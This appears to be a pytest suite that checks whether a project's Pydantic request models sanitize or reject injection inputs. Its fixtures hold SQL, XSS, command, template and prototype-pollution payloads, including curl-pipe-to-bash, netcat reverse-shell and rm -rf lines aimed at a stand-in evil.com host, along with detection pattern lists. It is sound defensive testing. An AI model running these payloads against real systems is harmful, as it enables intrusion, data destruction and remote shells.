"""Input Sanitization Effectiveness Tests

Comprehensive testing of input sanitization mechanisms across Pydantic models
to verify effectiveness against injection attacks, malformed data, and
malicious content patterns.

Test categories:
1. SQL injection pattern sanitization
2. XSS payload sanitization
3. Command injection prevention
4. Script injection blocking
5. HTML/XML sanitization
6. Special character handling
7. Unicode normalization security
8. Prototype pollution prevention
"""

import json

import pytest
from pydantic import ValidationError

from khive.services.composition.parts import ComposerRequest
from khive.services.orchestration.parts import AgentRequest


class TestSQLInjectionSanitization:
    """Test sanitization of SQL injection attack patterns."""

    @pytest.fixture
    def sql_injection_payloads(self) -> list[str]:
        """Common SQL injection attack patterns."""
        return [
            # Basic SQL injection
            "'; DROP TABLE users; --",
            "' OR '1'='1' --",
            "'; DELETE FROM accounts WHERE 1=1; --",
            "' UNION SELECT * FROM passwords --",
            # Advanced SQL injection
            "'; INSERT INTO admin VALUES('hacker', 'password'); --",
            "' AND (SELECT COUNT(*) FROM users) > 0 --",
            "'; EXEC xp_cmdshell('dir'); --",
            "'; SHUTDOWN; --",
            # Blind SQL injection
            "' AND SLEEP(10) --",
            "' OR (SELECT LENGTH(database())) = 8 --",
            "'; WAITFOR DELAY '00:00:10'; --",
            # Second-order SQL injection
            "admin'; DROP TABLE logs; --",
            "user' UNION SELECT @@version --",
            # NoSQL injection equivalents
            "'; db.users.drop(); //",
            "'; db.eval('while(true){}'); //",
        ]

    def test_sql_injection_sanitization_in_context(self, sql_injection_payloads):
        """Test SQL injection sanitization in ComposerRequest context field."""

        for sql_payload in sql_injection_payloads:
            context_variations = [
                f"User query: {sql_payload}",
                f"Search for: {sql_payload}",
                f"Filter by: {sql_payload}",
                sql_payload,  # Direct injection
            ]

            for context in context_variations:
                try:
                    request = ComposerRequest(
                        role="researcher",
                        context=context,
                        domains="database-operations",
                    )

                    # Check if dangerous SQL patterns remain
                    dangerous_sql_patterns = [
                        "DROP TABLE",
                        "DELETE FROM",
                        "INSERT INTO",
                        "UNION SELECT",
                        "xp_cmdshell",
                        "SHUTDOWN",
                        "SLEEP(",
                        "WAITFOR DELAY",
                        "--",
                        ";",
                        "db.users.drop",
                        "db.eval",
                    ]

                    context_upper = request.context.upper()
                    for pattern in dangerous_sql_patterns:
                        if pattern.upper() in context_upper:
                            pytest.fail(
                                f"SQL injection pattern not sanitized: {pattern} in '{sql_payload}'"
                            )

                except ValidationError:
                    # Acceptable - validation rejected the malicious input
                    pass

    def test_sql_injection_sanitization_in_domains(self, sql_injection_payloads):
        """Test SQL injection sanitization in ComposerRequest domains field."""

        for sql_payload in sql_injection_payloads:
            domain_variations = [
                f"database-ops,query:{sql_payload}",
                f"{sql_payload},data-analysis",
                f"search:{sql_payload}",
                sql_payload,  # Direct injection in domains
            ]

            for domain_spec in domain_variations:
                try:
                    request = ComposerRequest(
                        role="researcher",
                        context="Legitimate context",
                        domains=domain_spec,
                    )

                    # Check if SQL patterns remain in domains
                    if request.domains:
                        domains_upper = str(request.domains).upper()
                        sql_keywords = [
                            "DROP",
                            "DELETE",
                            "INSERT",
                            "UNION",
                            "SELECT",
                            "--",
                        ]

                        for keyword in sql_keywords:
                            if keyword in domains_upper:
                                pytest.fail(
                                    f"SQL injection in domains not sanitized: {keyword}"
                                )

                except ValidationError:
                    # Acceptable - validation rejected the input
                    pass


class TestXSSSanitization:
    """Test sanitization of Cross-Site Scripting (XSS) attack patterns."""

    @pytest.fixture
    def xss_payloads(self) -> list[str]:
        """Common XSS attack patterns."""
        return [
            # Basic script injection
            "<script>alert('XSS')</script>",
            "<script>document.write('Hacked')</script>",
            "<script>window.location='http://evil.com'</script>",
            # Event handler injection
            "<img src=x onerror=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input type='text' onfocus='alert(\"XSS\")'>",
            # JavaScript protocol injection
            "javascript:alert('XSS')",
            "javascript:void(0)",
            "javascript:eval('alert(1)')",
            # Advanced XSS
            "<svg onload=alert('XSS')>",
            "<iframe src='javascript:alert(\"XSS\")'></iframe>",
            "<object data='javascript:alert(\"XSS\")'></object>",
            # Encoded XSS
            "&lt;script&gt;alert('XSS')&lt;/script&gt;",
            "&#60;script&#62;alert('XSS')&#60;/script&#62;",
            "%3Cscript%3Ealert('XSS')%3C/script%3E",
            # Filter bypass attempts
            "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
            "<SCRIPT SRC=http://evil.com/xss.js></SCRIPT>",
            "<<script>alert('XSS')<</script>",
        ]

    def test_xss_sanitization_in_context(self, xss_payloads):
        """Test XSS payload sanitization in context fields."""

        for xss_payload in xss_payloads:
            context_variations = [
                f"User input: {xss_payload}",
                f"Display content: {xss_payload}",
                f"Process HTML: {xss_payload}",
                xss_payload,  # Direct XSS injection
            ]

            for context in context_variations:
                try:
                    request = ComposerRequest(
                        role="researcher", context=context, domains="web-development"
                    )

                    # Check if dangerous script patterns remain
                    dangerous_xss_patterns = [
                        "<script",
                        "</script>",
                        "javascript:",
                        "onerror=",
                        "onload=",
                        "onfocus=",
                        "<iframe",
                        "<object",
                        "<svg",
                        "alert(",
                        "eval(",
                        "document.write",
                    ]

                    context_lower = request.context.lower()
                    for pattern in dangerous_xss_patterns:
                        if pattern.lower() in context_lower:
                            pytest.fail(
                                f"XSS pattern not sanitized: {pattern} in '{xss_payload}'"
                            )

                except ValidationError:
                    # Acceptable - validation rejected the malicious input
                    pass

    def test_html_tag_sanitization(self):
        """Test sanitization of potentially dangerous HTML tags."""

        dangerous_html_tags = [
            "<script>malicious()</script>",
            "<iframe src='evil.com'></iframe>",
            "<object data='malicious.swf'></object>",
            "<embed src='evil.swf'>",
            "<form action='evil.com'></form>",
            "<link rel='stylesheet' href='evil.css'>",
            "<meta http-equiv='refresh' content='0;url=evil.com'>",
            "<base href='evil.com'>",
        ]

        for html_tag in dangerous_html_tags:
            try:
                request = ComposerRequest(
                    role="researcher",
                    context=f"Process HTML content: {html_tag}",
                    domains="html-processing",
                )

                # Check if HTML tags are properly sanitized/escaped
                if "<" in request.context and ">" in request.context:
                    # HTML tags should be escaped or removed
                    unescaped_tags = [
                        "<script",
                        "<iframe",
                        "<object",
                        "<embed",
                        "<form",
                        "<link",
                        "<meta",
                        "<base",
                    ]
                    context_lower = request.context.lower()

                    for tag in unescaped_tags:
                        if tag in context_lower:
                            pytest.fail(f"Dangerous HTML tag not sanitized: {tag}")

            except ValidationError:
                # Acceptable - validation rejected the HTML
                pass


class TestCommandInjectionSanitization:
    """Test sanitization of command injection attack patterns."""

    @pytest.fixture
    def command_injection_payloads(self) -> list[str]:
        """Command injection attack patterns."""
        return [
            # Basic command injection
            "; rm -rf /",
            "&& rm -rf /tmp/*",
            "| cat /etc/passwd",
            "|| whoami",
            # Windows command injection
            "& del C:\\Windows\\System32\\*",
            "&& dir C:\\Users",
            "| type C:\\Windows\\system.ini",
            # Shell metacharacter injection
            "`whoami`",
            "$(cat /etc/passwd)",
            "${IFS}cat${IFS}/etc/passwd",
            # Advanced command injection
            "; curl http://evil.com/shell.sh | bash",
            "&& wget http://evil.com/backdoor.exe",
            "| nc -e /bin/sh evil.com 4444",
            # Encoded command injection
            "%3Bwhoami",
            "%26%26%20cat%20/etc/passwd",
            "\x3bls\x20-la",
        ]

    def test_command_injection_sanitization(self, command_injection_payloads):
        """Test command injection pattern sanitization."""

        for cmd_payload in command_injection_payloads:
            context_variations = [
                f"Execute: {cmd_payload}",
                f"Run command: {cmd_payload}",
                f"Process: {cmd_payload}",
                cmd_payload,  # Direct command injection
            ]

            for context in context_variations:
                try:
                    request = ComposerRequest(
                        role="researcher", context=context, domains="system-operations"
                    )

                    # Check if dangerous command patterns remain
                    dangerous_cmd_patterns = [
                        "rm -rf",
                        "del ",
                        "cat /etc/",
                        "type C:\\",
                        "whoami",
                        "; ",
                        "&& ",
                        "| ",
                        "|| ",
                        "`",
                        "$(",
                        "${",
                        "curl ",
                        "wget ",
                        "nc -e",
                    ]

                    for pattern in dangerous_cmd_patterns:
                        if pattern in request.context:
                            pytest.fail(
                                f"Command injection pattern not sanitized: {pattern}"
                            )

                except ValidationError:
                    # Acceptable - validation rejected the command injection
                    pass

    def test_shell_metacharacter_sanitization(self):
        """Test sanitization of shell metacharacters."""

        shell_metacharacters = [
            ";",
            "&",
            "|",
            "`",
            "$",
            "(",
            ")",
            "<",
            ">",
            "\\",
            '"',
            "'",
            " ",
            "\t",
            "\n",
            "\r",
        ]

        for char in shell_metacharacters:
            dangerous_contexts = [
                f"filename{char}malicious_command",
                f"input{char}; rm -rf /",
                f"data{char}&& evil_command",
            ]

            for context in dangerous_contexts:
                try:
                    request = ComposerRequest(
                        role="researcher",
                        context=f"Process: {context}",
                        domains="file-operations",
                    )

                    # Some metacharacters might be acceptable in certain contexts
                    # But combinations like "; rm" should be blocked
                    dangerous_combinations = ["; ", "&& ", "|| ", "| "]

                    for combo in dangerous_combinations:
                        if combo in request.context:
                            pytest.fail(
                                f"Dangerous metacharacter combination not sanitized: {combo}"
                            )

                except ValidationError:
                    # Acceptable - validation rejected metacharacters
                    pass


class TestScriptInjectionSanitization:
    """Test sanitization of various script injection attempts."""

    def test_python_code_injection_sanitization(self):
        """Test sanitization of Python code injection."""

        python_injection_payloads = [
            "eval('import os; os.system(\"rm -rf /\")')",
            "exec('malicious_code()')",
            "__import__('os').system('evil_command')",
            "compile('malicious', 'string', 'exec')",
            "globals()['__builtins__']['eval']('code')",
            "locals()['eval']('malicious')",
            "getattr(__builtins__, 'eval')('code')",
        ]

        for payload in python_injection_payloads:
            try:
                request = ComposerRequest(
                    role="researcher",
                    context=f"Execute Python: {payload}",
                    domains="python-development",
                )

                # Check if dangerous Python patterns remain
                python_dangers = [
                    "eval(",
                    "exec(",
                    "__import__",
                    "compile(",
                    "globals()",
                    "locals()",
                    "getattr(",
                    "__builtins__",
                ]

                for danger in python_dangers:
                    if danger in request.context:
                        pytest.fail(f"Python injection pattern not sanitized: {danger}")

            except ValidationError:
                # Acceptable - validation rejected Python injection
                pass

    def test_template_injection_sanitization(self):
        """Test sanitization of template injection attacks."""

        template_injection_payloads = [
            # Jinja2 template injection
            "{{ ''.__class__.__mro__[1].__subclasses__()[104] }}",
            "{{ config.items() }}",
            "{{ self._TemplateReference__context }}",
            # Flask template injection
            "{{ url_for.__globals__['sys'].modules['os'].popen('id').read() }}",
            "{{ get_flashed_messages.__globals__.__builtins__.__import__('os').system('id') }}",
            # Generic template injection
            "{{7*7}}",
            "${7*7}",
            "#{7*7}",
            "<%= 7*7 %>",
            # Server-side template injection
            "{{constructor.constructor('alert(1)')()}}",
            "${T(java.lang.Runtime).getRuntime().exec('calc')}",
        ]

        for payload in template_injection_payloads:
            try:
                request = ComposerRequest(
                    role="researcher",
                    context=f"Template content: {payload}",
                    domains="template-processing",
                )

                # Check if template injection patterns remain
                template_dangers = [
                    "{{",
                    "}}",
                    "${",
                    "<%=",
                    "%>",
                    "__class__",
                    "__mro__",
                    "__subclasses__",
                    "__globals__",
                    "__builtins__",
                    "constructor",
                    "getRuntime",
                ]

                for danger in template_dangers:
                    if danger in request.context:
                        pytest.fail(
                            f"Template injection pattern not sanitized: {danger}"
                        )

            except ValidationError:
                # Acceptable - validation rejected template injection
                pass


class TestUnicodeNormalizationSecurity:
    """Test security of Unicode normalization and handling."""

    def test_unicode_homograph_attack_prevention(self):
        """Test prevention of Unicode homograph attacks."""

        # Unicode characters that look similar to ASCII
        homograph_attacks = [
            "аdmin",  # Cyrillic 'а' instead of ASCII 'a'
            "gооgle.com",  # Cyrillic 'о' instead of ASCII 'o'
            "раypal.com",  # Mixed Cyrillic characters
            "microsоft.com",  # Cyrillic 'о'
            "аpple.com",  # Cyrillic 'а'
        ]

        for attack in homograph_attacks:
            try:
                request = ComposerRequest(
                    role="researcher",
                    context=f"Visit website: {attack}",
                    domains="web-security",
                )

                # Check if homograph characters were normalized/detected
                # This might be acceptable depending on implementation
                # Main concern is if they bypass security checks

            except ValidationError:
                # Acceptable - validation detected homograph attack
                pass

    def test_unicode_normalization_bypass_prevention(self):
        """Test prevention of Unicode normalization bypasses."""

        # Various Unicode representations of dangerous patterns
        unicode_bypasses = [
            "\u002e\u002e\u002f\u002e\u002e\u002f\u002e\u002e\u002fetc\u002fpasswd",  # ../../../etc/passwd
            "\uff0e\uff0e\u002f\uff0e\uff0e\u002f\uff0e\uff0e\u002fetc\u002fpasswd",  # Full-width periods
            "\u003c\u0073\u0063\u0072\u0069\u0070\u0074\u003e",  # <script>
            "\uff1c\uff53\uff43\uff52\uff49\uff50\uff54\uff1e",  # Full-width <script>
        ]

        for bypass in unicode_bypasses:
            try:
                request = ComposerRequest(
                    role="researcher",
                    context=f"Process: {bypass}",
                    domains="unicode-handling",
                )

                # After normalization, dangerous patterns shouldn't remain
                normalized = request.context
                dangerous_patterns = ["../", "<script>", "etc/passwd"]

                for pattern in dangerous_patterns:
                    if pattern in normalized.lower():
                        pytest.fail(
                            f"Unicode bypass successful: {pattern} from {bypass!r}"
                        )

            except ValidationError:
                # Acceptable - validation rejected Unicode bypass
                pass


class TestPrototypePollutionPrevention:
    """Test prevention of prototype pollution attacks."""

    def test_json_prototype_pollution_prevention(self):
        """Test prevention of JSON prototype pollution."""

        pollution_payloads = [
            '{"__proto__": {"admin": true}}',
            '{"constructor": {"prototype": {"admin": true}}}',
            '{"__proto__": {"isAdmin": true, "role": "admin"}}',
            '{"constructor.prototype.admin": true}',
            '{"__proto__.admin": true}',
        ]

        for payload in pollution_payloads:
            try:
                # Test through context field that might parse JSON
                request = ComposerRequest(
                    role="researcher",
                    context=f"Process JSON: {payload}",
                    domains="json-processing",
                )

                # Check if dangerous prototype patterns remain
                dangerous_proto_patterns = [
                    "__proto__",
                    "constructor.prototype",
                    ".admin",
                    ".isAdmin",
                ]

                for pattern in dangerous_proto_patterns:
                    if pattern in request.context:
                        pytest.fail(
                            f"Prototype pollution pattern not sanitized: {pattern}"
                        )

            except ValidationError:
                # Acceptable - validation rejected prototype pollution
                pass

    def test_nested_object_pollution_prevention(self):
        """Test prevention of nested object pollution attempts."""

        nested_pollution = {
            "user": {"__proto__": {"admin": True, "permissions": "all"}},
            "data": {"constructor": {"prototype": {"isAdmin": True}}},
        }

        try:
            # Test through AgentRequest instruction field
            request = AgentRequest(
                instruct={
                    "instruction": "Process user data",
                    "context": json.dumps(nested_pollution),
                },
                compose_request={"role": "researcher"},
            )

            # Check if pollution patterns remain in serialized instruction
            instruct_str = str(
                request.instruct.__dict__
                if hasattr(request.instruct, "__dict__")
                else request.instruct
            )

            pollution_patterns = [
                "__proto__",
                "constructor",
                "prototype",
                "admin",
                "isAdmin",
            ]
            for pattern in pollution_patterns:
                if pattern in instruct_str:
                    pytest.fail(f"Nested pollution pattern not sanitized: {pattern}")

        except (ValidationError, ValueError):
            # Acceptable - validation rejected nested pollution
            pass


class TestInputSanitizationConsistency:
    """Test consistency of input sanitization across different fields and models."""

    def test_cross_field_sanitization_consistency(self):
        """Test that sanitization is consistent across different fields."""

        malicious_input = "<script>alert('XSS')</script>'; DROP TABLE users; --"

        # Test same input across different fields
        test_cases = [
            # ComposerRequest fields
            (
                "ComposerRequest.context",
                lambda: ComposerRequest(
                    role="researcher", context=malicious_input, domains="testing"
                ),
            ),
            (
                "ComposerRequest.domains",
                lambda: ComposerRequest(
                    role="researcher", context="test", domains=malicious_input
                ),
            ),
            # AgentRequest fields
            (
                "AgentRequest.instruct",
                lambda: AgentRequest(
                    instruct={"instruction": malicious_input, "context": "test"},
                    compose_request={"role": "researcher"},
                ),
            ),
        ]

        sanitization_results = {}

        for field_name, create_request in test_cases:
            try:
                request = create_request()

                # Extract the field value for comparison
                if "context" in field_name:
                    field_value = request.context
                elif "domains" in field_name:
                    field_value = str(request.domains) if request.domains else ""
                elif "instruct" in field_name:
                    field_value = str(
                        request.instruct.__dict__
                        if hasattr(request.instruct, "__dict__")
                        else request.instruct
                    )
                else:
                    field_value = ""

                sanitization_results[field_name] = field_value

            except ValidationError:
                sanitization_results[field_name] = "REJECTED"

        # Check for consistency - all fields should handle malicious input similarly
        # Either all sanitize or all reject, but behavior should be consistent
        handling_methods = set(
            (
                "SANITIZED"
                if result != "REJECTED" and malicious_input not in result
                else "REJECTED" if result == "REJECTED" else "VULNERABLE"
            )
            for result in sanitization_results.values()
        )

        # Should not have vulnerable fields if others are protected
        assert (
            "VULNERABLE" not in handling_methods
        ), f"Inconsistent sanitization: {sanitization_results}"

    def test_sanitization_effectiveness_metrics(self):
        """Test and measure sanitization effectiveness across attack categories."""

        attack_categories = {
            "sql_injection": ["'; DROP TABLE users; --", "' OR 1=1 --"],
            "xss": ["<script>alert('xss')</script>", "<img src=x onerror=alert(1)>"],
            "command_injection": ["; rm -rf /", "&& cat /etc/passwd"],
            "path_traversal": ["../../../etc/passwd", "..\\..\\..\\windows\\system32"],
            "code_injection": ["eval('malicious')", "__import__('os').system('id')"],
        }

        effectiveness_metrics = {}

        for category, payloads in attack_categories.items():
            blocked = 0
            sanitized = 0
            vulnerable = 0

            for payload in payloads:
                try:
                    request = ComposerRequest(
                        role="researcher",
                        context=f"Test {category}: {payload}",
                        domains="security-testing",
                    )

                    # Check if payload remains in context
                    if payload in request.context:
                        vulnerable += 1
                    else:
                        sanitized += 1

                except ValidationError:
                    blocked += 1

            total = len(payloads)
            effectiveness_metrics[category] = {
                "blocked": blocked / total,
                "sanitized": sanitized / total,
                "vulnerable": vulnerable / total,
            }

        # Report effectiveness metrics
        for category, metrics in effectiveness_metrics.items():
            vulnerable_ratio = metrics["vulnerable"]
            if vulnerable_ratio > 0.1:  # Allow 10% vulnerability threshold
                pytest.fail(
                    f"High vulnerability in {category}: {vulnerable_ratio:.1%} vulnerable"
                )

        # Overall security should be > 90% (blocked + sanitized)
        overall_protected = sum(
            metrics["blocked"] + metrics["sanitized"]
            for metrics in effectiveness_metrics.values()
        ) / len(effectiveness_metrics)

        assert (
            overall_protected >= 0.9
        ), f"Overall protection rate too low: {overall_protected:.1%}"
